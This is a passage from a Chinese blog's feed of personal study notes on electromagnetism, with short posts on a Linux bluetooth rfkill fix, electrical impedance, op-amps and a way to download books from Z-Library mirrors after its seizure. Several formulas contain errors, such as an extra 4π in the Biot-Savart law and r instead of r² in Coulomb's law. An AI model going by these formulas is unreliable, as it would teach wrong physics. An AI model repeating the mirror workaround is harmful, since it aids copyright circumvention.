定义了一个物理量 <mark>magnetic dipole moment 电偶矩</mark>:<br>$$<br>\mu &#x3D; NIA<br>$$</p><p>最终，torque 的表达式可以写为:<br>$$<br>\tau &#x3D; \mu \times B<br>$$</p><p>利用 $\tau$ 和 角度 $\theta$ 计算做功为:<br>$$<br>U &#x3D; \int \tau d\theta &#x3D; \int NIAB \sin \theta d\theta &#x3D; -\mu B \cos \theta + C<br>$$</p><p>一般我们选取 $\theta &#x3D; 90^\circ$ 也就是磁场和线圈垂直为初始点，即 $U &#x3D; 0$, 就可以算出:<br>$$<br>\displaylines{U &#x3D; 0 &#x3D; -\mu B \cos \theta + C &#x3D; 0 + C \newline~ \newline C &#x3D; 0 \newline~ \newline \therefore  U &#x3D; -\mu B \cos \theta &#x3D; -u \cdot B}<br>$$</p><h2 id="25-8-霍尔效应-The-Hall-Effect"><a href="#25-8-霍尔效应-The-Hall-Effect" class="headerlink" title="25-8 霍尔效应 The Hall Effect"></a>25-8 霍尔效应 The Hall Effect</h2><p>The Hall Effect 描述了，当一个电子在存在磁场和电场的环境下运动时，其速度到达一定值，使得电场力和洛伦兹力相等.</p><p>$$<br>\displaylines{F &#x3D; eE \newline~ \newline F &#x3D; ev \times B \newline~ \newline eE &#x3D; evB \newline~ \newline E &#x3D; vB}<br>$$</p><p>此时的电势差被称为 Hall emf ($\xi$):<br>$$<br>\displaylines{\xi &#x3D; El &#x3D; vBl}<br>$$</p><p><img src="/../img/Hall_Effect.png"></p><h1 id="Chapter-26-磁场的源-Source-of-Magnetic-Field"><a href="#Chapter-26-磁场的源-Source-of-Magnetic-Field" class="headerlink" title="Chapter 26 磁场的源 Source of Magnetic Field"></a>Chapter 26 磁场的源 Source of Magnetic Field</h1><h2 id="26-1-Magnetic-Field-Due-to-a-Straight-Wire"><a href="#26-1-Magnetic-Field-Due-to-a-Straight-Wire" class="headerlink" title="26-1 Magnetic Field Due to a Straight Wire"></a>26-1 Magnetic Field Due to a Straight Wire</h2><p>实验观察出的现象:<br>$$<br>\displaylines{B \propto \frac{I}{r}}<br>$$<br>也就是说，电流越大，其产生的磁场越大，离电流越远，磁场越小.</p><p><img src="/../img/Stright_wire_generate_megnetic_field.png"><br>在这种 Straight Wire 产生的磁场，其计算公式为 (通用计算式要结合后面的 Ampere’s law):<br>$$<br>\displaylines{B &#x3D; \frac{\mu_0}{2 \pi} \frac{I}{r}}<br>$$</p><p>其中 $\mu_0$ 是一个常量，称为 permeability of free space, 值为 $4 \pi \times 10^{-7} T \cdot m&#x2F;A$</p><h2 id="26-2-两个平行导线间的力-Force-between-Two-Parallel-Wires"><a href="#26-2-两个平行导线间的力-Force-between-Two-Parallel-Wires" class="headerlink" title="26-2 两个平行导线间的力 Force between Two Parallel Wires"></a>26-2 两个平行导线间的力 Force between Two Parallel Wires</h2><p><img src="/../img/two_parallel_wire_produce_magnetic_field.png"></p><p>施加的力大小相等方向相反.</p><blockquote><p>公式推导<br>$$<br>\displaylines{B_1 &#x3D; \frac{\mu_0}{2 \pi} \frac{I_1}{r} \newline~ \newline F &#x3D; I_2B_1l &#x3D; \frac{F}{l} &#x3D; \frac{\mu_0}{2 \pi} \frac{I_1 I_2}{d}}<br>$$</p></blockquote><h2 id="26-3-安培和库仑的定义-Operational-Definition-of-the-Ampere-and-the-Coulomb"><a href="#26-3-安培和库仑的定义-Operational-Definition-of-the-Ampere-and-the-Coulomb" class="headerlink" title="26-3 安培和库仑的定义 Operational Definition of the Ampere and the Coulomb"></a>26-3 安培和库仑的定义 Operational Definition of the Ampere and the Coulomb</h2><h2 id="26-4-Ampere’s-Law"><a href="#26-4-Ampere’s-Law" class="headerlink" title="26-4 Ampere’s Law"></a>26-4 Ampere’s Law</h2><p><img src="/../img/magnetic_field_with_irregular_shape.png"></p><p>Ampere’s law 运用积分的概念，将路径划分为极小份，然后相加得到:<br>$$<br>\displaylines{\sum B \Delta l &#x3D; \mu_0 I_{encl} \newline~ \newline \int B \cdot dl &#x3D; \mu_0 I_{encl}}<br>$$<br>这里每一点的 B 都不相同，因此主要是靠右式计算. 也可以看出，其实和高斯定理一样，选取合适的路径即可计算，一般选取圆，上述图形的计算其实和下面一样.<br><img src="/../img/chose_a_path_for_ampere_law.png"><br>此时再回头推导之前计算 Straight Wire 产生的磁场强度.</p><blockquote><p>推导过程</p></blockquote><p>$$<br>\displaylines{\int B \cdot dl &#x3D; B \int dl &#x3D; B(2 \pi r) &#x3D; \mu_0 I_{encl} \newline~ \newline B &#x3D; \frac{\mu_0 I}{2 \pi r}}<br>$$</p><h2 id="26-5-螺线管和环形线圈产生的磁场-Magnetic-Field-of-a-Solenoid-and-a-Toroid"><a href="#26-5-螺线管和环形线圈产生的磁场-Magnetic-Field-of-a-Solenoid-and-a-Toroid" class="headerlink" title="26-5 螺线管和环形线圈产生的磁场 Magnetic Field of a Solenoid and a Toroid"></a>26-5 螺线管和环形线圈产生的磁场 Magnetic Field of a Solenoid and a Toroid</h2><blockquote><p>solenoid 示意图</p></blockquote><p><img src="/../img/solenoid_looks_like.png"></p><p>一个长线绕了很多圈.</p><p>螺线管内部的磁场较强，外部相对于内部非常小 </p><p>从上图可以看出，产生外部磁场的部分为:<br><img src="/../img/solenoid_create_outside_magnetic_field.png"></p><blockquote><p>公式推导</p></blockquote><p><img src="/../img/magnetic_field_created_by_solenoid.png"></p><p>$$<br>\displaylines{\oint B \cdot dl &#x3D; \int_a^b B \cdot dl + \int_b^c B \cdot dl +\int_c^d B \cdot dl +\int_d^a B \cdot dl \newline~ \newline &#x3D; \int_c^dB \cdot dl \newline~ \newline &#x3D; Bl \newline~ \newline \oint B \cdot dl &#x3D; N \mu_0 I \newline~ \newline Bl &#x3D; N \mu_0 I \newline~ \newline n &#x3D; \frac{N}{l} \newline~ \newline B &#x3D; \mu_0 n I}<br>$$<br>其中 bc 边和 ad 边抵消，ba 边太小而被忽略.</p><p>n 的单位长度的圈数. 可以看出，solenoid 内的磁场强度和线圈数和电流大小有关.</p><h3 id="Toroid"><a href="#Toroid" class="headerlink" title="Toroid"></a>Toroid</h3><blockquote><p>Toroid 示意图</p></blockquote><p>其外形像把 solenoid 折成一个环.<br><img src="/../img/diagram_of_Toroid.png"></p><blockquote><p>内部磁场公式推导</p></blockquote><p>还是看上面那一幅图，结合 Ampere’s law, 选取的面为 Path1 由虚线标识:<br>$$<br>\displaylines{\oint B \cdot dl &#x3D; \mu_0 I_{encl} \newline~ \newline B(s \pi r) &#x3D; \mu_0NI \newline~ \newline B &#x3D; \frac{\mu_0 NI}{2 \pi r}}<br>$$</p><blockquote><p>特点:</p></blockquote><ul><li>外部磁场为零</li></ul><blockquote><p>推导</p></blockquote><p>选取的为 Path2, 对于每一个环如图:<br><img src="/../img/Toroid_same_current_different_direction.png"></p><p>左右流过的电流大小相等，方向相反，合电流因此为 0, 结合 Ampere’s law:<br>$$<br>\displaylines{\oint B \cdot dl &#x3D; \mu_0 I_{encl} \newline~ \newline B (2 \pi r) &#x3D; 0 \newline~ \newline B &#x3D; 0}<br>$$</p><h2 id="26-6-Biot-Savart-Law"><a href="#26-6-Biot-Savart-Law" class="headerlink" title="26-6 Biot-Savart Law"></a>26-6 Biot-Savart Law</h2><p>用于计算 $dl$ 即一小段电流产生的磁场强度. 而 Ampere’s law 需要闭合曲线.</p><p>和 Coulomb’s Law 结合记忆:</p><blockquote><p>Coulomb’s law</p></blockquote><p>$$<br>\displaylines{dE &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{dq}{r}}<br>$$</p><blockquote><p>Biot-Savart’s law</p></blockquote><p>$$<br>\displaylines{dB &#x3D; \frac{\mu_0 I}{4 \pi} \frac{dl \times \hat{r}}{4 \pi r^2} \newline~ \newline dB &#x3D; \frac{\mu_0 I dl \sin \theta}{4 \pi r^2} \newline~ \newline B &#x3D; \int dB}<br>$$</p><!-- 这应该是 Ampere's law 的微分形式，结合 Ampere's law 推导: --><!-- $$ --><!-- \displaylines{\oint B \cdot dl = B \oint dl = \mu_0 I \newline~ \newline dBdl = } --><!-- $$ --><p><img src="/../img/Biot_Savart_Law_where_is_sine.png"></p><p>注意这是 $r^2$, 结合库仑定理记忆.</p><h2 id="26-8-电磁和螺线管-Electromagnets-and-Solenoids"><a href="#26-8-电磁和螺线管-Electromagnets-and-Solenoids" class="headerlink" title="26-8 电磁和螺线管 Electromagnets and Solenoids"></a>26-8 电磁和螺线管 Electromagnets and Solenoids</h2><p>可以把 solenoids 视作一个磁铁, 一侧被看作是 north pole, 另一侧为 south pole. </p><h2 id="26-9-磁性物质中的磁场-滞后现象-Magnetic-Field-in-Magnetic-Materials-Hysteresis"><a href="#26-9-磁性物质中的磁场-滞后现象-Magnetic-Field-in-Magnetic-Materials-Hysteresis" class="headerlink" title="26-9 磁性物质中的磁场; 滞后现象 Magnetic Field in Magnetic Materials; Hysteresis"></a>26-9 磁性物质中的磁场; 滞后现象 Magnetic Field in Magnetic Materials; Hysteresis</h2><p>在一个 Toroid 中加入铁之后，总的磁场强度为:<br>$$<br>\displaylines{B_0 &#x3D; \mu_0 n I \newline~ \newline B &#x3D; B_0 + B_M &#x3D; \mu nI}<br>$$<br>(毕竟加入铁之后磁场强度会变大, 且一般情况下 $B_M &gt;&gt; B_0$)<br>上面的 $\mu$ 被称为 magnetic permeability.</p><p>对于 ferromagnetic (铁磁) 材料而言， $\mu$ 要远大于 $\mu_0$ ( $\mu_0$ 如何得出的)</p><h1 id="Chapter-27-电磁感应和法拉第定律-Electromagnetic-Induction-and-Faraday’s-Law"><a href="#Chapter-27-电磁感应和法拉第定律-Electromagnetic-Induction-and-Faraday’s-Law" class="headerlink" title="Chapter 27 电磁感应和法拉第定律 Electromagnetic Induction and Faraday’s Law"></a>Chapter 27 电磁感应和法拉第定律 Electromagnetic Induction and Faraday’s Law</h1><h2 id="27-1-感应电动势-Induced-EMF"><a href="#27-1-感应电动势-Induced-EMF" class="headerlink" title="27-1 感应电动势 Induced EMF"></a>27-1 感应电动势 Induced EMF</h2><p>Faraday 发现，恒定的磁场不会产生电流，只有变化的磁场才能产生电流.</p><blockquote><p>总结为</p></blockquote><p>An induced emf is produced by a changing magnetic field</p><h2 id="27-2-法拉第感应定律和楞次定律Faraday’s-Law-of-Induction-Lenz’s-Law"><a href="#27-2-法拉第感应定律和楞次定律Faraday’s-Law-of-Induction-Lenz’s-Law" class="headerlink" title="27-2 法拉第感应定律和楞次定律Faraday’s Law of Induction; Lenz’s Law"></a>27-2 法拉第感应定律和楞次定律Faraday’s Law of Induction; Lenz’s Law</h2><p>磁场变化越快，induced emf 越大, 也就是和变化率有关 (这里是 $\phi_B$ 即 flux 的变化率).</p><blockquote><p>求 $\phi_B$ flux 的公式<br>$$<br>\displaylines{\phi_B &#x3D; B_\perp A &#x3D; BA \cos \theta &#x3D; B \cdot A \newline~ \newline \phi_B &#x3D; \int B \cdot dA}<br>$$</p></blockquote><p><img src="/../img/magnetic_flux.png"></p><p>$\phi$ flux 可以看作是 total number of lines passing through the loop. 单位可以从公式中看出，为 tesla-meter$^2$, 即 weber, $1 Wb &#x3D; 1 T \cdot m^2$</p><blockquote><p>Faraday’s Law of induction</p></blockquote><p>$$<br>\displaylines{\xi &#x3D; - \frac{d \phi_B}{dt} \newline~ \newline \xi &#x3D; -N \frac{d \phi_B}{dt}}<br>$$</p><p>为什么是负数，这就涉及到 Lenz’s Law.</p><blockquote><p>Lenz’s Law</p></blockquote><p>An induced emf gives rise to a current whose magnetic field opposes the original change in flux.</p><p>也就是阻碍变化. 即如果 flux 增大，那么感应的则会是反方向，如果 flux 减小，那么感应的会是同方向.</p><h2 id="27-3-移动导体中的感应电动势-EMF-Induced-in-a-Moving-Conductor"><a href="#27-3-移动导体中的感应电动势-EMF-Induced-in-a-Moving-Conductor" class="headerlink" title="27-3 移动导体中的感应电动势 EMF Induced in a Moving Conductor"></a>27-3 移动导体中的感应电动势 EMF Induced in a Moving Conductor</h2><blockquote><p>导体棒移动, 公式推导</p></blockquote><p>$$<br>\displaylines{\xi &#x3D; \frac{d \phi_B}{dt} &#x3D; \frac{B dA}{dt} &#x3D; \frac{Blv dt}{dt} &#x3D; Blv}<br>$$</p><p><img src="/../img/emf_induced_in_a_moving_conductor.png"></p><blockquote><p>导体棒受力公式推导</p></blockquote><p>$$<br>\displaylines{F &#x3D; IlB \newline~ \newline I &#x3D; \frac{\xi}{R} \newline~ \newline \xi &#x3D; Blv \newline~ \newline I &#x3D; \frac{Blv}{R} \newline~ \newline F &#x3D; IlB &#x3D; \frac{B^2 l^2}{R} v }<br>$$</p><h2 id="27-4-变化磁通量产生电场-A-Changing-Magnetic-Flux-Produces-an-Electric-Field"><a href="#27-4-变化磁通量产生电场-A-Changing-Magnetic-Flux-Produces-an-Electric-Field" class="headerlink" title="27-4 变化磁通量产生电场 A Changing Magnetic Flux Produces an Electric Field"></a>27-4 变化磁通量产生电场 A Changing Magnetic Flux Produces an Electric Field</h2><blockquote><p>Faraday’s Law – General Form</p></blockquote><p>$$<br>\displaylines{V_{ab} &#x3D; \int_a^b E \cdot dl \newline~ \newline \xi &#x3D; \oint E \cdot dl \newline~ \newline \oint E \cdot dl &#x3D; - \frac{d \phi_B}{dt}}<br>$$</p><p>如果力是 conservative force, 如这里的电场力，那么:<br>$$<br>\displaylines{ V_{ab} &#x3D; V_a - V_b &#x3D; \int_a^b E \cdot dl \newline~ \newline \oint E \cdot dl &#x3D; 0}<br>$$</p><p>尽管静电场是 conservative fields, 但是变化磁场产生的电场是 nonconservative field.</p><h1 id="Chapter-28-电感和电磁波-Inductance-and-Electromagnetic-Oscillations"><a href="#Chapter-28-电感和电磁波-Inductance-and-Electromagnetic-Oscillations" class="headerlink" title="Chapter 28 电感和电磁波 Inductance; and Electromagnetic Oscillations"></a>Chapter 28 电感和电磁波 Inductance; and Electromagnetic Oscillations</h1><h2 id="28-1-互感-Mutual-Inductance"><a href="#28-1-互感-Mutual-Inductance" class="headerlink" title="28-1 互感 Mutual Inductance"></a>28-1 互感 Mutual Inductance</h2><p>不管是互感系数还是自感系数，都只和导体本身有关，如形状，面积. 与引起感应现象的电流无关.</p><p>Inductance 这个量用来描述，电流的变化会引起的 $\phi_B$ flux 的变化是多少.</p><blockquote><p>互感示意图</p></blockquote><p><img src="/../img/mutual_inductance_diagram.png"></p><p>Mutual inductance, 从名字就能看出，至少需要两个导体.</p><blockquote><p>Inductance 计算公式</p></blockquote><p>$$<br>\displaylines{M_{21} &#x3D; \frac{N_2 \phi_{21}}{I_1}}<br>$$</p><blockquote><p>表明 Inductance 和电流 I 无关的公式推导</p></blockquote><p>借助这道题目:</p><p><img src="/../img/no_relation_to_current_Inductance.png"><br>$$<br>\displaylines{B &#x3D; \mu_0 \frac{N_1}{l} l_1 \newline~ \newline \phi_{21} &#x3D; BA &#x3D; \mu_0 \frac{N_1}{l} I_1 A \newline~ \newline M &#x3D; \frac{N_2 \phi_{21}}{I_1} &#x3D; \frac{\mu_0 N_1 N_2 A}{l}}<br>$$</p><blockquote><p>用 Inductance 计算 emf 的公式推导</p></blockquote><p>$$<br>\displaylines{M_21 &#x3D; \frac{N_2 \phi_{21}}{I_1} \newline~ \newline \xi_2 &#x3D; - N_2 \frac{d \phi_{21}}{dt} \newline~ \newline \xi_2 &#x3D; - M_{21} \frac{dI_1}{dt}}<br>$$</p><p>Mutual inductance 的单位是 henry (H), 从公式可以看出，为 $1 H &#x3D; 1 V \cdot s&#x2F;A &#x3D; 1 \Omege \cdot s$</p><p>Mutual inductance 可用来传递能量.</p><h2 id="28-2-自感-Self-Inductance"><a href="#28-2-自感-Self-Inductance" class="headerlink" title="28-2 自感 Self-Inductance"></a>28-2 自感 Self-Inductance</h2><p>和 mutual inductance 有一点区别，这里是一个 solenoid (可能也不是 solenoid), 它自身的变化引起自身线圈产生感应电流.</p><blockquote><p>Self-Inductance 计算公式</p></blockquote><p>$$<br>\displaylines{L &#x3D; \frac{N \phi_B}{I}}<br>$$</p><blockquote><p>同样可以推导出其大小与电流无关, 这里以一个 solenoid 为例</p></blockquote><p>$$<br>\displaylines{B &#x3D; \mu_0 nl \newline~ \newline n &#x3D; \frac{N}{l} \newline~ \newline \phi_B &#x3D; BA &#x3D; \frac{\mu_0 NIA}{l} \newline~ \newline L &#x3D; \frac{N \phi_B}{I} &#x3D; \frac{\mu_0 N^2 A}{l}}<br>$$</p><blockquote><p>利用自感和 Faraday’s law 计算 emf</p></blockquote><p>$$<br>\displaylines{ L &#x3D; N \frac{\phi_B}{I} \newline~ \newline \xi &#x3D; -N \frac{d \phi_B}{dt} &#x3D; - L \frac{dI}{dt}}<br>$$</p><p>从公式可以看出, $L$ 越大，反向的 emf 就越大, $I &#x3D; \frac{V}{R}$, 就会变小，因此inductance 可以充当电阻使用.</p><h2 id="28-3-存储在磁场中的能量-Energy-Stored-in-a-Magnetic-Field"><a href="#28-3-存储在磁场中的能量-Energy-Stored-in-a-Magnetic-Field" class="headerlink" title="28-3 存储在磁场中的能量 Energy Stored in a Magnetic Field"></a>28-3 存储在磁场中的能量 Energy Stored in a Magnetic Field</h2><p>让感应电流达到 I 所消耗的能量就是 inductance 所存储的能量.</p><blockquote><p>公式推导，当 inductance L 中电流的变化速率为 $ \frac{dI}{dt}$ 时</p></blockquote><p>$$<br>\displaylines{P &#x3D; I \xi &#x3D; L I \frac{dI}{dt} \newline~ \newline dW &#x3D; P dt &#x3D; L I di \newline~ \newline W &#x3D; \int dW &#x3D; \int_0^I L I dI &#x3D; \frac{1}{2} L I^2 \newline~ \newline U &#x3D; \frac{1}{2} L I^2}<br>$$</p><p>写成磁场的形式，这和载体有关，这里是一个 solenoid:<br>$$<br>\displaylines{L &#x3D; \frac{\mu_0 N^2 A}{l} \newline~ \newline U &#x3D; \frac{1}{2} L I^2 &#x3D; \frac{1}{2} ( \frac{\mu_0 N^2 A}{l}) (\frac{Bl}{\mu_0 N})^2 &#x3D; \frac{1}{2} \frac{B^2}{\mu_0}Al \newline~ \newline \mu &#x3D; \frac{1}{2} \frac{B^2}{\mu_0}}<br>$$</p><p>$\mu$ 是能量密度 ($Al$ 就是体积).</p><p>与存储在电场中的能量结合记忆:</p><blockquote><p>电场中</p></blockquote><p>$$<br>\displaylines{\mu &#x3D; \frac{1}{2} \epsilon_0 E^2}<br>$$</p><blockquote><p>磁场中</p></blockquote><p>$$<br>\displaylines{\mu &#x3D; \frac{1}{2} \frac{B^2}{\mu_0}}<br>$$</p><h1 id="Chapter-29-麦克斯韦方程组和电磁波-Maxwell’s-Equations-and-Electromagnetic-Waves"><a href="#Chapter-29-麦克斯韦方程组和电磁波-Maxwell’s-Equations-and-Electromagnetic-Waves" class="headerlink" title="Chapter 29 麦克斯韦方程组和电磁波 Maxwell’s Equations and Electromagnetic Waves"></a>Chapter 29 麦克斯韦方程组和电磁波 Maxwell’s Equations and Electromagnetic Waves</h1>]]></content>
    
    
    <categories>
      
      <category>Physics</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>perlbrew-的作用</title>
    <link href="/2022/11/27/perlbrew-%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
    <url>/2022/11/27/perlbrew-%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-bluetoothctl-报错-NotReady-以及-adapter-not-powered</title>
    <link href="/2022/11/27/%E5%85%B3%E4%BA%8E-bluetoothctl-%E6%8A%A5%E9%94%99-NotReady-%E4%BB%A5%E5%8F%8A-adapter-not-powered/"/>
    <url>/2022/11/27/%E5%85%B3%E4%BA%8E-bluetoothctl-%E6%8A%A5%E9%94%99-NotReady-%E4%BB%A5%E5%8F%8A-adapter-not-powered/</url>
    
    <content type="html"><![CDATA[<p>报错提示如下:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Failed to connect: org.bluez.Error.NotReady br-connection-adapter-not-powered<br></code></pre></td></tr></table></figure><p>原因为 <code>rfkill</code> 中被 block, 使用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ rfkill unblock all<br></code></pre></td></tr></table></figure><p>解决.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript-DOM-编程艺术-Notes</title>
    <link href="/2022/11/26/JavaScript-DOM-%E7%BC%96%E7%A8%8B%E8%89%BA%E6%9C%AF-Notes/"/>
    <url>/2022/11/26/JavaScript-DOM-%E7%BC%96%E7%A8%8B%E8%89%BA%E6%9C%AF-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第1章"><a href="#第1章" class="headerlink" title="第1章"></a>第1章</h1>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>zlib-查封后书籍下载方法</title>
    <link href="/2022/11/26/zlib-%E6%9F%A5%E5%B0%81%E5%90%8E%E4%B9%A6%E7%B1%8D%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/"/>
    <url>/2022/11/26/zlib-%E6%9F%A5%E5%B0%81%E5%90%8E%E4%B9%A6%E7%B1%8D%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>先通过 “<a href="https://tearch.v4.zhelper.net/&quot;">https://tearch.v4.zhelper.net/&quot;</a> 这个网站查找书籍，点击书名后的 url 如: “<a href="https://download.v4.zhelper.net/download/5281016/64e692&quot;">https://download.v4.zhelper.net/download/5281016/64e692&quot;</a>, 之后把 “tearch.v4.zhelper.net” 改为如 “test1.zlib.download”，最终为 “<a href="https://test1.zlib.download/download/5281016/64e692&quot;">https://test1.zlib.download/download/5281016/64e692&quot;</a> 即可下载.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>如何理解物理中的-moment</title>
    <link href="/2022/11/26/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E7%89%A9%E7%90%86%E4%B8%AD%E7%9A%84-moment/"/>
    <url>/2022/11/26/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E7%89%A9%E7%90%86%E4%B8%AD%E7%9A%84-moment/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.youtube.com/watch?v=NueuPY2Yqq4">参考 YouTube1</a></p><p>当你转动一个物体时，需要一个力 (force) 以及一个支点 (pivot point), 而当你施加的力离物体较远时，你会感觉到更容易，因此需要一个量来描述这种由 force 和 distance 共同影响转动的难易程度:<br>$$<br>moment &#x3D; force \times distance<br>$$</p><p>这就是 moment 的定义以及为什么需要 moment. 这个 moment 也可以称为 torque.</p>]]></content>
    
    
    <categories>
      
      <category>Physics</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>磁性的由来</title>
    <link href="/2022/11/26/%E7%A3%81%E6%80%A7%E7%9A%84%E7%94%B1%E6%9D%A5/"/>
    <url>/2022/11/26/%E7%A3%81%E6%80%A7%E7%9A%84%E7%94%B1%E6%9D%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="参考知乎1"><a href="#参考知乎1" class="headerlink" title="参考知乎1"></a><a href="https://www.zhihu.com/question/38879132/answer/81035171">参考知乎1</a></h1><p>磁场的产生可以分为两种:</p><ul><li>运动电流 (变化的电场产生磁场)</li><li>基本粒子的自旋</li></ul><p>所有物质都有磁性，只是大小不同.</p><p>浅显的认知: 不容易被磁化的物质，其内部的原子难以受外部磁场的影响而排列整齐.</p><p>磁力的存在是由于磁场.</p><h1 id="参考-YouTube"><a href="#参考-YouTube" class="headerlink" title="参考 YouTube"></a><a href="https://www.youtube.com/watch?v=MRqQQGO7Xe8">参考 YouTube</a></h1><p>质子和电子的自旋:<br><img src="/../img/self_rotate_of_proton_and_electron.png"></p><p>自旋和电子绕核旋转都会产生电流:<br><img src="/../img/current_made_by_self_rotate_indecate_mag.png"></p><p>如这张图，这三个磁场向量合向量就是这个粒子的磁场方向.</p><h2 id="同一方向"><a href="#同一方向" class="headerlink" title="同一方向"></a>同一方向</h2><p>如果所有的粒子的磁场向量都位于一个方向:<br><img src="/../img/vector_in_the_same_direction.png"></p><p>那么其合向量就很大. 物体就会表现出磁性.</p><h2 id="不同方向"><a href="#不同方向" class="headerlink" title="不同方向"></a>不同方向</h2><p>如果各个粒子的向量方向不同，那么就会有狠多被抵消掉:<br><img src="/../img/vectors_in_different_direction.png"></p><p>物体的磁性就不会表现出.</p><h2 id="施加外部磁场"><a href="#施加外部磁场" class="headerlink" title="施加外部磁场"></a>施加外部磁场</h2><p>施加一个外部磁场，可能使物体内粒子产生的磁场向量方向排列整齐，这也是为什么铁块在靠经一块磁铁使就具有了磁性:</p><p><img src="/../img/outer_magnetic_field_adjust_the_vectors_direction.png"></p><h2 id="相关数学公式"><a href="#相关数学公式" class="headerlink" title="相关数学公式"></a>相关数学公式</h2><p><img src="/../img/related_mathmatic_equations_in_why_there_is_a_magnetism.png"></p>]]></content>
    
    
    <categories>
      
      <category>Physics</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Learn-JavaScript_by_Example-Notes</title>
    <link href="/2022/11/25/Learn-JavaScript-by-Example-Notes/"/>
    <url>/2022/11/25/Learn-JavaScript-by-Example-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="关于-delete"><a href="#关于-delete" class="headerlink" title="关于 delete"></a>关于 delete</h1>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>电阻和阻抗</title>
    <link href="/2022/11/25/%E7%94%B5%E9%98%BB%E5%92%8C%E9%98%BB%E6%8A%97/"/>
    <url>/2022/11/25/%E7%94%B5%E9%98%BB%E5%92%8C%E9%98%BB%E6%8A%97/</url>
    
    <content type="html"><![CDATA[<h1 id="参考知乎1"><a href="#参考知乎1" class="headerlink" title="参考知乎1"></a><a href="https://zhuanlan.zhihu.com/p/55749598">参考知乎1</a></h1><h2 id="电阻"><a href="#电阻" class="headerlink" title="电阻"></a>电阻</h2><p>resistance, 描述的是一个器材或材料对流过其中的电流的阻碍作用, 其本质是将电能转换为其他形式的能。</p><p>计算电阻是:<br>$$<br>R &#x3D; \frac{U}{I}<br>$$</p><h2 id="阻抗"><a href="#阻抗" class="headerlink" title="阻抗"></a>阻抗</h2><p>impedance, 其包含三个部分:</p><ul><li>阻性, resistivity, 将电能转换为热能</li><li>容性, capacity, 以空间或电介质内的电场形式储存电能, 这里的 “容” 指的是电容，极板间是电场</li><li>感性, sensibility, 以空间或磁介质内的磁场储存电能, 这里的 “感” 指的是感应磁场</li></ul><p>为什么是 “抗”, 不管是转换为其他能还是存储电能，都对电流的移动有阻碍作用.</p><p>计算同样是用瞬时电压除以电流.</p><p>但其表达式是复数:<br>$$<br>Z &#x3D; R + jX<br>$$</p><h1 id="参考知乎2"><a href="#参考知乎2" class="headerlink" title="参考知乎2"></a><a href="https://www.zhihu.com/question/320087849/answer/651969887">参考知乎2</a></h1><p>阻抗是电阻+电抗.</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>运算放大器</title>
    <link href="/2022/11/25/%E8%BF%90%E7%AE%97%E6%94%BE%E5%A4%A7%E5%99%A8/"/>
    <url>/2022/11/25/%E8%BF%90%E7%AE%97%E6%94%BE%E5%A4%A7%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="参考-B-站1"><a href="#参考-B-站1" class="headerlink" title="参考 B 站1"></a><a href="https://www.bilibili.com/video/BV1yK411V75K/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考 B 站1</a></h1><p>运算放大器是一个集成期间，它是由诸多晶体器件 (如晶体管) 所构成.</p><p>从外部特性来看，运算放大器是一个具有:</p><ul><li>三个信号端子</li><li>两个电源端子<br>的器件.</li></ul><p>它有:</p><ul><li>两个具有高输入电阻的电压信号输入端.</li><li>一个具有低输出电阻的电压信号输出端</li><li>正负两个电源端</li></ul><p><img src="/../img/amplifier_structure.png"></p><p>需要注意，并不是所有运算放大器的输入端都具有高输入电阻.</p><h1 id="参考-B-站2"><a href="#参考-B-站2" class="headerlink" title="参考 B 站2"></a><a href="https://www.bilibili.com/video/BV14r4y117rC/?spm_id_from=333.788.recommend_more_video.2&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考 B 站2</a></h1><p>放大器可以将信号放大, 为什么又叫运算放大器? 是由于其常被用来模拟加, 减, 微分，积分运算。</p><p>放大器中的电源和输入是什么区别?<br>自己简单理解为，放大器是一个简化的电路 (不是说结构简单，而是封装的含义，内部的电源细节没有展现出来), 其内部的电路需要供电.<br>如 741 放大器的内部电路:<br><img src="/../img/741_ope_amp_structure.png"></p><h1 id="参考-B-站3"><a href="#参考-B-站3" class="headerlink" title="参考 B 站3"></a><a href="https://www.bilibili.com/video/BV14E411i76t/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考 B 站3</a></h1><p>运算放大器的输入端永远没有电流 (输入和输出电流都没有), 输出端可以有电流的输入和输出:<br><img src="/../img/no_current_at_input_of_ope_amp.png"></p><p>从输出端流入或流出的电流由运算放大器的供电端提供.<br><img src="/../img/current_come_from_source.png"></p><p>给运算放大器供电的两个端子通常没有显示出来.</p><p>运算放大器产生的 output voltage 的大小在两个电压端子提供的电压之间.</p><p>运算放大器将带 “+” 号一端的输入端电压与带 “-“ 号一端的输入电压相减:<br><img 